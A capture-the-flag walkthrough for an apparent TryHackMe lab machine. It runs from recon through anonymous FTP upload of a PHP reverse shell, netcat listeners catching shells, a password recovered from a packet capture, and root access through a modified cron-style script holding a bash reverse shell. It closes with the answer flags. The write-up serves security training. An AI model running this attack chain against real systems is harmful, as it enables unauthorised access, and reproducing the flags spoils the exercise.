# Task 1: Welcome to Spice Hut!
![[1 81.png]]
## Question
> What is the secret spicy soup recipe?
- Let's first scan the IP address using `nmap`.
```
$ nmap -sC -sV 10.10.96.227
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 11:24 IST
Nmap scan report for 10.10.96.227
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.48.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.70 seconds
```
- As we can see there are three open ports:
	- Port 21: ftp
	- Port 22: ssh
	- Port 80: http
- Let's visit the machine's HTTP port through the browser.
![[2 80.png]]
- As we can see, there is nothing of importance on this page.
- We can try to find other pages or directories using `gobuster`.
```
$ gobuster dir -u http://10.10.96.227 -w /usr/share/wordlists/dirb/common.txt                 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.96.227
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/files                (Status: 301) [Size: 312] [--> http://10.10.96.227/files/]
/index.html           (Status: 200) [Size: 808]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
- Let's try out the `/files` directory.
- We can login go to the FTP server of the machine.
```
$ ftp anonymous@10.10.96.227
Connected to 10.10.96.227.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
- Note that the password for anonymous login is `anonymous`.
- Let's look around a bit.
```
ftp> ls
229 Entering Extended Passive Mode (|||62019|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
```
- We can upload a reverse shell in this directory.
- We will be using the `/usr/share/webshells/php/php-reverse-shell.php` script after making some modifications.
![[4 47.png]]
- We replaced the IP address with our `tun0` address and set the port to a port of our choice.
- Let's upload the file to the FTP server using `put`.
```
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||50625|)
150 Ok to send data.
100% |***********************************************************************************************************************************************************************************************|  5494        2.27 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (19.80 KiB/s)
```
- Now we have to listen on the `9999` port using `netcat`.
```
$ nc -nlvp 9999            
listening on [any] 9999 ...
```
- Let's go to the `/files/ftp` folder.
![[5 32.png]]
- All we have to do now is execute the `php-reverse-shell.php` file.
- If we go back to our console, we must have a shell.
```
$ nc -nlvp 9999            
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.96.227] 37428
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:33:05 up 42 min,  0 users,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
- We can stabilize the shell using the following commands:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

- Let's look for the secret spicy soup recipe.
```
www-data@startup:/$ ls
bin   home            lib         mnt         root  srv  vagrant
boot  incidents       lib64       opt         run   sys  var
dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
```
- Here, the `recipe.txt` file seems interesting. We can read it using the `cat` command.
```
www-data@startup:/$ cat recipe.txt 
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```
## Answer
```
love
```

## Question
> What are the contents of user.txt?
-  We have to go to the `/incidents` directory.
```
www-data@startup:/incidents$ ls
suspicious.pcapng
```
- Let's copy the `suspicious.pcapng` file to the `ftp` directory.
```
www-data@startup:/incidents$ cp suspicious.pcapng /var/www/html/files/ftp/
www-data@startup:/incidents$ ls /var/www/html/files/ftp/
php-reverse-shell.php  suspicious.pcapng
```
- Let's look at the ftp login.
```
ftp> ls
229 Entering Extended Passive Mode (|||32073|)
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118          5494 Dec 06 06:28 php-reverse-shell.php
-rwxr-xr-x    1 33       33          31224 Dec 06 06:55 suspicious.pcapng
226 Directory send OK.
```
- We can now download this file using the `get` command.
```
ftp> get suspicious.pcapng
local: suspicious.pcapng remote: suspicious.pcapng
229 Entering Extended Passive Mode (|||41055|)
150 Opening BINARY mode data connection for suspicious.pcapng (31224 bytes).
100% |***********************************************************************************************************************************************************************************************| 31224      118.42 KiB/s    00:00 ETA
226 Transfer complete.
31224 bytes received in 00:00 (79.21 KiB/s)
```
- We can now use Wireshark to analyze the packet capture.
- In frame 45 we can see that the user has entered some commands.
![[7 18.png]]
- Let `Follow TCP Stream`.
![[8 10.png]]
- The password for the `lennie` user is `c4ntg3t3n0ughsp1c3`.
```
www-data@startup:/$ su lennie
Password: 
lennie@startup:/$ 
```
- We can now go to `/home/lennie` and get the flag.
```
lennie@startup:/$ cd /home/lennie/
lennie@startup:~$ ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt 
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```
## Answer
```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

## Question
> What are the contents of root.txt?
- Let's check what's inside the `scripts/` directory.
```
lennie@startup:~$ cd scripts/
lennie@startup:~/scripts$ ls
planner.sh  startup_list.txt
```
- We can check what the `planner.sh` file is doing using `cat`.
```
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
- We can see that it execute the `/etc/print.sh` file.
- Let's check that file out.
```
lennie@startup:~/scripts$ ls -la /etc/ | grep "print.sh"
-rwx------  1 lennie lennie    25 Nov 12  2020 print.sh
```
- So we can execute the `print.sh` file as `lennie`.
- But before that let's modify it to get a reverse shell.
- We can get a bash reverse shell from Revshells.com.
![[9 7.png]]
- The IP address is our `tun0` address.
![[10 6.png]]
- After saving the changes, we can listen on port `9998` and  run the `planner.sh` file.
```
$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.244.57] 43162
sh: 0: can't access tty; job control turned off
#
```
- Let's get the root flag.
```
# ls
root.txt
# cat root.txt  
THM{f963aaa6a430f210222158ae15c3d76d}
```
## Answer
```
THM{f963aaa6a430f210222158ae15c3d76d}
```